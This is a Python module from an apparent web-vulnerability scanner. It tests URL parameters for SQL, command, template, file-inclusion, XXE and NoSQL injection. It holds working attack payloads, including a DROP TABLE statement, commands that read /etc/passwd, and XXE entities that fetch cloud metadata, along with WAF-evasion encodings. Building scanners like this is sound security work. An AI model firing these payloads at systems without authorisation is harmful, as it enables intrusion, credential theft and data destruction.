# scanner/dast/modules/injection.py
#
# ENHANCED INJECTION MODULE — Multi-strategy, multi-encoding, multi-database
# Tests: SQLi (error/union/boolean/time/stacked/NoSQL), CMDI, SSTI, LFI, XXE
# Each test uses WAF bypass mutations and context-aware payload selection.

import asyncio
import logging
import os
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import httpx

logger = logging.getLogger(__name__)

# Default configuration
DEFAULT_CONFIG = {
    "sqli_payloads_per_param": 20,
    "cmdi_payloads_per_param": 15,
    "ssti_payloads_per_param": 10,
    "lfi_payloads_per_param": 12,
    "xxe_payloads_per_param": 8,
    "nosql_payloads_per_param": 10,
    "max_mutations_per_payload": 6,
    "request_timeout": 20,
    "time_delay_threshold": 3.0,
    "response_diff_threshold": 50,
    "concurrent_requests": 5,
}

# Enhanced SQL injection error signatures
SQLI_ERROR_SIGNATURES = [
    # MySQL
    r"MySQL.*error",
    r"SQL syntax.*MySQL",
    r"Warning.*mysql",
    r"MySQL server version",
    r"for the right syntax to use",
    r"You have an error in your SQL syntax",
    
    # PostgreSQL
    r"PostgreSQL.*ERROR",
    r"pg_.*error",
    r"PSQLException",
    r"org\.postgresql\.util\.PSQLException",
    
    # SQL Server
    r"Microsoft.*SQL Server",
    r"ODBC.*SQL Server",
    r"SQLServer.*Exception",
    r"System\.Data\.SqlClient\.SqlException",
    
    # Oracle
    r"ORA-\d{5}",
    r"Oracle.*error",
    r"Oracle.*Exception",
    r"PLS-\d{5}",
    
    # SQLite
    r"SQLite.*error",
    r"SQLite3::",
    
    # Generic
    r"SQL.*error",
    r"SQL.*syntax",
    r"Unclosed.*quotation",
    r"quoted string not properly terminated",
    r"undefined column",
    r"unknown column",
    r"table.*doesn't exist",
    r"column.*doesn't exist",
]

# Command injection output markers
CMDI_OUTPUT_MARKERS = [
    "root:x:", "root:0:0", "daemon:", "bin/bash", "bin/sh",
    "uid=", "gid=", "groups=", "www-data", "apache", "nginx",
    "Windows IP Configuration", "Microsoft Windows", "Volume Serial",
    "Directory of", "[boot loader]", "[fonts]", "SENTINEL_CMDI",
]

# Enhanced payload libraries
SQLI_PAYLOADS = [
    # Error-based
    "'",
    "\"",
    "';",
    "\";",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--",
    "\" UNION SELECT NULL--",
    
    # Union-based
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT @@version,USER(),DATABASE()--",
    
    # Boolean-based
    "' AND '1'='1",
    "' AND '1'='2",
    "' OR EXISTS(SELECT * FROM users)--",
    
    # Time-based
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; SELECT * FROM users--",
]

CMDI_PAYLOADS = [
    # Unix
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    "; whoami",
    "| whoami",
    "; id",
    "| id",
    "; ls -la",
    "| ls -la",
    
    # Windows
    "& dir",
    "| dir",
    "& whoami",
    "| whoami",
    "& type C:\\windows\\win.ini",
    "| type C:\\windows\\win.ini",
]

SSTI_PAYLOADS = [
    # Generic
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    
    # Framework-specific
    "{{''.__class__}}",
    "${''.getClass()}",
    "<%= ''.class %>",
]

NOSQL_PAYLOADS = [
    # MongoDB
    "' || '1'=='1",
    "'; return true;",
    "{$ne: null}",
    "{$gt: ''}",
    "{$where: \"1 == 1\"}",
    
    # Generic
    "' OR 1=1--",
    "admin' || '1'=='1",
    "'; return true; var x='",
]

class InjectionModule:
    def __init__(self, scanner, config: Optional[Dict] = None):
        self.scanner = scanner
        self.config = {**DEFAULT_CONFIG, **(config or {})}
        self.rate_limiter = asyncio.Semaphore(self.config["concurrent_requests"])

    async def run(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Run all injection tests with enhanced error handling"""
        try:
            tasks = []
            
            for param in params:
                # Get context for parameter
                context = await self._get_context(client, url, param)
                
                # Register canary for second-order detection
                canary = f"canary_{param}_{os.urandom(3).hex()}"
                if hasattr(self.scanner, 'canary_map'):
                    self.scanner.canary_map[canary] = {"url": url, "param": param}
                
                canary_url = self._inject_param(url, param, canary)
                await self._safe_request(client, "GET", canary_url)
                
                # Schedule injection tests
                tasks.append(self.test_sqli(client, url, param, context))
                tasks.append(self.test_cmdi(client, url, param))
                tasks.append(self.test_ssti(client, url, param))
                tasks.append(self.test_lfi(client, url, param))
                tasks.append(self.test_xxe(client, url, param))
                tasks.append(self.test_nosql(client, url, param))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Log any exceptions
            for result in results:
                if isinstance(result, Exception):
                    logger.error(f"Injection test failed: {result}")
                    
        except Exception as e:
            logger.error(f"Injection module failed for {url}: {e}")

    # ── Enhanced SQL Injection Testing ────────────────────────────────────────
    async def test_sqli(self, client: httpx.AsyncClient, url: str, param: str, context: str) -> None:
        """Comprehensive SQL injection testing"""
        try:
            # Get baseline response and latency
            baseline, base_lat = await self._get_baseline(client, url)
            if not baseline:
                return
                
            for raw_payload in SQLI_PAYLOADS[:self.config["sqli_payloads_per_param"]]:
                for mutated in self._apply_mutations(raw_payload)[:self.config["max_mutations_per_payload"]]:
                    if await self._test_sqli_payload(client, url, param, mutated, baseline, base_lat):
                        return  # Stop after first detection
                        
        except Exception as e:
            logger.error(f"SQLi test failed for {url} param {param}: {e}")

    async def _test_sqli_payload(self, client: httpx.AsyncClient, url: str, param: str, 
                               payload: str, baseline: httpx.Response, base_lat: float) -> bool:
        """Test a specific SQLi payload"""
        test_url = self._inject_param(url, param, payload)
        response = await self._safe_request(client, "GET", test_url)
        
        if not response:
            return False
            
        # Error-based detection
        if self._detect_sqli_errors(response.text):
            self._report_sqli(url, param, payload, "Error-Based", response)
            return True
            
        # Union-based detection
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            if self._detect_union_injection(response.text, baseline.text):
                self._report_sqli(url, param, payload, "Union-Based", response)
                return True
                
        # Boolean-based detection
        if any(op in payload.upper() for op in ["OR", "AND", "NOT"]):
            false_url = self._inject_param(url, param, self._invert_boolean_payload(payload))
            false_response = await self._safe_request(client, "GET", false_url)
            
            if false_response and self._detect_boolean_difference(response.text, false_response.text, baseline.text):
                self._report_sqli(url, param, payload, "Boolean-Based", response)
                return True
                
        # Time-based detection
        if any(keyword in payload.upper() for keyword in ["SLEEP", "WAITFOR", "BENCHMARK", "PG_SLEEP"]):
            elapsed = await self._measure_response_time(client, test_url)
            if elapsed >= base_lat + self.config["time_delay_threshold"]:
                self._report_sqli(url, param, payload, "Time-Based", response, elapsed, base_lat)
                return True
                
        return False

    def _detect_sqli_errors(self, response_text: str) -> bool:
        """Detect SQL error signatures in response"""
        text_lower = response_text.lower()
        
        for signature in SQLI_ERROR_SIGNATURES:
            try:
                if re.search(signature, text_lower, re.IGNORECASE):
                    return True
            except re.error:
                continue
                
        return False

    def _detect_union_injection(self, response_text: str, baseline_text: str) -> bool:
        """Detect successful UNION injection"""
        # Check for significant content difference
        diff = abs(len(response_text) - len(baseline_text))
        if diff > self.config["response_diff_threshold"]:
            return True
            
        # Check for column markers
        for i in range(1, 10):
            if f"SENTINEL_COL_{i}" in response_text:
                return True
                
        return False

    def _invert_boolean_payload(self, payload: str) -> str:
        """Invert boolean logic in payload"""
        replacements = [
            ("1=1", "1=2"),
            ("'1'='1'", "'1'='2'"),
            ("OR", "AND"),
            ("||", "&&"),
        ]
        
        inverted = payload
        for old, new in replacements:
            inverted = inverted.replace(old, new)
            
        return inverted

    def _detect_boolean_difference(self, true_text: str, false_text: str, baseline_text: str) -> bool:
        """Detect boolean-based SQLi through response differences"""
        true_diff = abs(len(true_text) - len(baseline_text))
        false_diff = abs(len(false_text) - len(baseline_text))
        
        # Significant difference between true and false responses
        if abs(true_diff - false_diff) > self.config["response_diff_threshold"]:
            return True
            
        # Content pattern differences
        if true_text != false_text and len(true_text) > 100 and len(false_text) > 100:
            return True
            
        return False

    # ── Enhanced Command Injection Testing ────────────────────────────────────
    async def test_cmdi(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Comprehensive command injection testing"""
        try:
            # Get baseline for time-based detection
            baseline, base_lat = await self._get_baseline(client, url)
            
            # Test output-based CMDI
            output_payloads = [
                ("; cat /etc/passwd", CMDI_OUTPUT_MARKERS),
                ("| cat /etc/passwd", CMDI_OUTPUT_MARKERS),
                ("$(cat /etc/passwd)", CMDI_OUTPUT_MARKERS),
                ("`cat /etc/passwd`", CMDI_OUTPUT_MARKERS),
                ("; whoami", ["root", "www-data", "apache", "nginx"]),
                ("| whoami", ["root", "www-data", "apache", "nginx"]),
                ("; id", ["uid=", "gid=", "groups="]),
                ("| id", ["uid=", "gid=", "groups="]),
                ("& dir", ["Volume Serial", "Directory of"]),
                ("| dir", ["Volume Serial", "Directory of"]),
            ]
            
            for payload, markers in output_payloads:
                for mutated in self._apply_mutations(payload)[:self.config["max_mutations_per_payload"]]:
                    if await self._test_cmdi_output(client, url, param, mutated, markers):
                        return
                        
            # Test time-based CMDI
            time_payloads = [
                "; sleep 6",
                "| sleep 6",
                "$(sleep 6)",
                "`sleep 6`",
                "& ping -n 6 127.0.0.1",
                "| ping -n 6 127.0.0.1",
            ]
            
            for payload in time_payloads:
                for mutated in self._apply_mutations(payload)[:2]:
                    if await self._test_cmdi_time(client, url, param, mutated, base_lat):
                        return
                        
        except Exception as e:
            logger.error(f"CMDI test failed for {url} param {param}: {e}")

    async def _test_cmdi_output(self, client: httpx.AsyncClient, url: str, param: str, 
                              payload: str, markers: List[str]) -> bool:
        """Test output-based command injection"""
        test_url = self._inject_param(url, param, payload)
        response = await self._safe_request(client, "GET", test_url)
        
        if not response:
            return False
            
        for marker in markers:
            if marker in response.text:
                self._report_cmdi(url, param, payload, "Output-Based", response, marker)
                return True
                
        return False

    async def _test_cmdi_time(self, client: httpx.AsyncClient, url: str, param: str, 
                            payload: str, base_lat: float) -> bool:
        """Test time-based command injection"""
        test_url = self._inject_param(url, param, payload)
        elapsed = await self._measure_response_time(client, test_url)
        
        if elapsed >= base_lat + self.config["time_delay_threshold"]:
            self._report_cmdi(url, param, payload, "Time-Based", None, f"Delay: {elapsed:.2f}s")
            return True
            
        return False

    # ── Enhanced SSTI Testing ─────────────────────────────────────────────────
    async def test_ssti(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Comprehensive server-side template injection testing"""
        try:
            for payload in SSTI_PAYLOADS[:self.config["ssti_payloads_per_param"]]:
                for mutated in self._apply_mutations(payload)[:self.config["max_mutations_per_payload"]]:
                    if await self._test_ssti_payload(client, url, param, mutated):
                        return
                        
        except Exception as e:
            logger.error(f"SSTI test failed for {url} param {param}: {e}")

    async def _test_ssti_payload(self, client: httpx.AsyncClient, url: str, param: str, payload: str) -> bool:
        """Test a specific SSTI payload"""
        test_url = self._inject_param(url, param, payload)
        response = await self._safe_request(client, "GET", test_url)
        
        if not response:
            return False
            
        # Check for expression evaluation
        if self._detect_ssti_evaluation(response.text, payload):
            self._report_ssti(url, param, payload, response)
            return True
            
        return False

    def _detect_ssti_evaluation(self, response_text: str, payload: str) -> bool:
        """Detect SSTI expression evaluation"""
        # Check for mathematical expression results
        if "7*7" in payload and "49" in response_text:
            return True
        if "3*3" in payload and "9" in response_text:
            return True
            
        # Check for template engine specific patterns
        ssti_patterns = [
            r"__class__", r"getClass\(\)", r"\.class", r"TemplateSyntaxError",
            r"TemplateNotFound", r"TemplateRuntimeError",
        ]
        
        for pattern in ssti_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        return False

    # ── Enhanced LFI Testing ──────────────────────────────────────────────────
    async def test_lfi(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Comprehensive local file inclusion testing"""
        try:
            baseline, _ = await self._get_baseline(client, url)
            baseline_text = baseline.text if baseline else ""
            
            lfi_payloads = [
                "/etc/passwd",
                "../../etc/passwd",
                "....//....//etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "C:\\windows\\win.ini",
            ]
            
            for payload in lfi_payloads[:self.config["lfi_payloads_per_param"]]:
                for mutated in self._apply_mutations(payload)[:self.config["max_mutations_per_payload"]]:
                    if await self._test_lfi_payload(client, url, param, mutated, baseline_text):
                        return
                        
        except Exception as e:
            logger.error(f"LFI test failed for {url} param {param}: {e}")

    async def _test_lfi_payload(self, client: httpx.AsyncClient, url: str, param: str, 
                              payload: str, baseline_text: str) -> bool:
        """Test a specific LFI payload"""
        test_url = self._inject_param(url, param, payload)
        response = await self._safe_request(client, "GET", test_url)
        
        if not response:
            return False
            
        # Check for file content indicators
        lfi_indicators = [
            "root:x:", "root:0:0", "daemon:", "nobody:", "bin/bash",
            "[boot loader]", "[fonts]", "for 16-bit", "Microsoft Windows",
        ]
        
        for indicator in lfi_indicators:
            if (indicator in response.text and 
                (not baseline_text or indicator not in baseline_text)):
                self._report_lfi(url, param, payload, response, indicator)
                return True
                
        return False

    # ── Enhanced XXE Testing ──────────────────────────────────────────────────
    async def test_xxe(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Comprehensive XXE testing"""
        try:
            xxe_payloads = [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            ]
            
            for payload in xxe_payloads[:self.config["xxe_payloads_per_param"]]:
                if await self._test_xxe_payload(client, url, param, payload):
                    return
                    
        except Exception as e:
            logger.error(f"XXE test failed for {url} param {param}: {e}")

    async def _test_xxe_payload(self, client: httpx.AsyncClient, url: str, param: str, payload: str) -> bool:
        """Test a specific XXE payload"""
        test_url = self._inject_param(url, param, payload)
        response = await self._safe_request(client, "GET", test_url)
        
        if not response:
            return False
            
        # Check for XXE indicators
        xxe_indicators = [
            "root:x:", "root:0:0", "daemon:", "[boot loader]", "[fonts]",
            "ami-id", "instance-id", "local-ipv4", "public-keys",
        ]
        
        for indicator in xxe_indicators:
            if indicator in response.text:
                self._report_xxe(url, param, payload, response, indicator)
                return True
                
        return False

    # ── Enhanced NoSQL Injection Testing ──────────────────────────────────────
    async def test_nosql(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Comprehensive NoSQL injection testing"""
        try:
            for payload in NOSQL_PAYLOADS[:self.config["nosql_payloads_per_param"]]:
                for mutated in self._apply_mutations(payload)[:self.config["max_mutations_per_payload"]]:
                    if await self._test_nosql_payload(client, url, param, mutated):
                        return
                        
        except Exception as e:
            logger.error(f"NoSQL test failed for {url} param {param}: {e}")

    async def _test_nosql_payload(self, client: httpx.AsyncClient, url: str, param: str, payload: str) -> bool:
        """Test a specific NoSQL payload"""
        test_url = self._inject_param(url, param, payload)
        response = await self._safe_request(client, "GET", test_url)
        
        if not response:
            return False
            
        # Check for NoSQL indicators
        nosql_indicators = [
            "mongo", "mongodb", "no sql", "$where", "$gt", "$ne", "$regex",
            "syntax error", "unexpected token", "BSON", "ObjectId",
        ]
        
        text_lower = response.text.lower()
        for indicator in nosql_indicators:
            if indicator in text_lower:
                self._report_nosql(url, param, payload, response, indicator)
                return True
                
        return False

    # ── Utility Methods ───────────────────────────────────────────────────────
    def _apply_mutations(self, payload: str) -> List[str]:
        """Generate WAF-bypass variants of a payload"""
        mutations = [payload]
        
        # URL encoding
        mutations.append(urllib.parse.quote(payload))
        mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # Case alternation
        if any(c.isalpha() for c in payload):
            mangled = "".join(
                c.upper() if i % 2 == 0 else c.lower() 
                for i, c in enumerate(payload)
            )
            mutations.append(mangled)
            
        # SQL comment breaking
        sql_keywords = {
            "SELECT": "SE/**/LECT",
            "UNION": "UN/**/ION",
            "OR": "/**/OR/**/",
            "AND": "/**/AND/**/",
        }
        
        for keyword, replacement in sql_keywords.items():
            if keyword in payload.upper():
                mutated = re.sub(
                    keyword, replacement, payload, flags=re.IGNORECASE
                )
                mutations.append(mutated)
                
        # Space replacement
        mutations.append(payload.replace(" ", "/**/"))
        mutations.append(payload.replace(" ", "+"))
        mutations.append(payload.replace(" ", "%09"))
        mutations.append(payload.replace(" ", "%0A"))
        mutations.append(payload.replace(" ", "%0D"))
        
        # Null byte injection
        if any(keyword in payload.lower() for keyword in ["script", "select", "union"]):
            mutated = payload.replace("script", "scri\x00pt")
            mutated = mutated.replace("select", "sel\x00ect")
            mutated = mutated.replace("union", "un\x00ion")
            mutations.append(mutated)
            
        return list(set(mutations))  # Remove duplicates

    async def _get_baseline(self, client: httpx.AsyncClient, url: str) -> Tuple[Optional[httpx.Response], float]:
        """Get baseline response and latency"""
        start_time = asyncio.get_event_loop().time()
        response = await self._safe_request(client, "GET", url)
        latency = asyncio.get_event_loop().time() - start_time
        return response, latency

    async def _measure_response_time(self, client: httpx.AsyncClient, url: str) -> float:
        """Measure response time for time-based detection"""
        start_time = asyncio.get_event_loop().time()
        await self._safe_request(client, "GET", url)
        return asyncio.get_event_loop().time() - start_time

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject parameter value into URL"""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query, keep_blank_values=True)
        query_dict[param] = [value]
        new_query = urlencode(query_dict, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    async def _safe_request(self, client: httpx.AsyncClient, method: str, url: str, 
                          **kwargs) -> Optional[httpx.Response]:
        """Make a safe HTTP request with timeout and error handling"""
        async with self.rate_limiter:
            try:
                kwargs.setdefault("timeout", self.config["request_timeout"])
                return await self.scanner._req(client, method, url, **kwargs)
            except Exception as e:
                logger.debug(f"Request failed: {method} {url}: {e}")
                return None

    async def _get_context(self, client: httpx.AsyncClient, url: str, param: str) -> str:
        """Get parameter context (simplified version)"""
        # This would normally analyze where the parameter is reflected
        return "unknown"

    # ── Reporting Methods ─────────────────────────────────────────────────────
    def _report_sqli(self, url: str, param: str, payload: str, subtype: str, 
                   response: Optional[httpx.Response], elapsed: float = 0, base_lat: float = 0) -> None:
        """Report SQL injection finding"""
        evidence = f"{subtype} detected"
        if subtype == "Time-Based":
            evidence += f" - Delay: {elapsed:.2f}s (baseline: {base_lat:.2f}s)"
        elif response:
            evidence += f" - HTTP {response.status_code}"
            
        self.scanner._add_finding({
            "type": "SQL Injection",
            "subtype": subtype,
            "url": url,
            "parameter": param,
            "payload": payload,
            "severity": "Critical",
            "confidence": 0.92,
            "evidence": evidence,
            "description": f"Parameter '{param}' vulnerable to {subtype} SQL injection.",
        })

    def _report_cmdi(self, url: str, param: str, payload: str, subtype: str, 
                   response: Optional[httpx.Response], evidence_detail: str = "") -> None:
        """Report command injection finding"""
        evidence = f"{subtype} detected"
        if evidence_detail:
            evidence += f" - {evidence_detail}"
        elif response:
            evidence += f" - HTTP {response.status_code}"
            
        self.scanner._add_finding({
            "type": "Command Injection",
            "subtype": subtype,
            "url": url,
            "parameter": param,
            "payload": payload,
            "severity": "Critical",
            "confidence": 0.95,
            "evidence": evidence,
            "description": f"Parameter '{param}' vulnerable to {subtype} command injection.",
        })

    def _report_ssti(self, url: str, param: str, payload: str, response: httpx.Response) -> None:
        """Report SSTI finding"""
        self.scanner._add_finding({
            "type": "Server-Side Template Injection (SSTI)",
            "subtype": "Template Evaluation",
            "url": url,
            "parameter": param,
            "payload": payload,
            "severity": "Critical",
            "confidence": 0.90,
            "evidence": "Template expression evaluated",
            "description": f"Parameter '{param}' vulnerable to server-side template injection.",
        })

    def _report_lfi(self, url: str, param: str, payload: str, response: httpx.Response, indicator: str) -> None:
        """Report LFI finding"""
        self.scanner._add_finding({
            "type": "Local File Inclusion (LFI)",
            "subtype": "Path Traversal",
            "url": url,
            "parameter": param,
            "payload": payload,
            "severity": "Critical",
            "confidence": 0.95,
            "evidence": f"File indicator: '{indicator}'",
            "description": f"Parameter '{param}' vulnerable to local file inclusion.",
        })

    def _report_xxe(self, url: str, param: str, payload: str, response: httpx.Response, indicator: str) -> None:
        """Report XXE finding"""
        self.scanner._add_finding({
            "type": "XML External Entity (XXE)",
            "subtype": "Entity Processing",
            "url": url,
            "parameter": param,
            "payload": payload[:120] + "..." if len(payload) > 120 else payload,
            "severity": "Critical",
            "confidence": 0.95,
            "evidence": f"XXE indicator: '{indicator}'",
            "description": f"Parameter '{param}' vulnerable to XML external entity processing.",
        })

    def _report_nosql(self, url: str, param: str, payload: str, response: httpx.Response, indicator: str) -> None:
        """Report NoSQL injection finding"""
        self.scanner._add_finding({
            "type": "NoSQL Injection",
            "subtype": "Operator Injection",
            "url": url,
            "parameter": param,
            "payload": payload[:80] + "..." if len(payload) > 80 else payload,
            "severity": "High",
            "confidence": 0.85,
            "evidence": f"NoSQL indicator: '{indicator}'",
            "description": f"Parameter '{param}' vulnerable to NoSQL injection.",
        })
